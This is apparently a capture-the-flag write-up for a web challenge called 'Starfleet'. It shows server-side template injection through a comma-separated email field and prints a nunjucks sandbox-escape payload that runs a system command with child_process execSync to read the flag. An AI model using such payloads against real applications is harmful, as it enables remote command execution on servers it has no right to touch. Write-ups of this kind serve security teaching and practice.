# Starfleet

## Challenge

We are given a webpage where we can enter an email address.
An email will then be sent to the address with a short message:

```
Hello vexixa7893@sumwan.com

A cat has been deployed to process your submission 🐈
```

## Solution

We can enter multiple email addresses by separating them with commas and the server will attempt to email each address.
This allows us to manipulate the user input variable while still getting the email output.

The email is vulnerable to template injection, which we can verify by using our temporary email address and something like `{{ 1 + 1 }}`:

```
Hello vexixa7893@sumwan.com,2

A cat has been deployed to process your submission 🐈
```

Thanks to this blog post for providing the nunjucks sandbox escape:

http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

There is a binary in the docker container at `/readflag` which will output the contents of the flag file.
Using the above sandbox escape technique, we can call the binary and inject the flag into the email template:

```
vexixa7893@sumwan.com,{{range.constructor("return global.process.mainModule.require('child_process').execSync('/readflag')")()}}
```

```
Hello vexixa7893@sumwan.com,CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}

A cat has been deployed to process your submission 🐈
```

## Flag

CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}

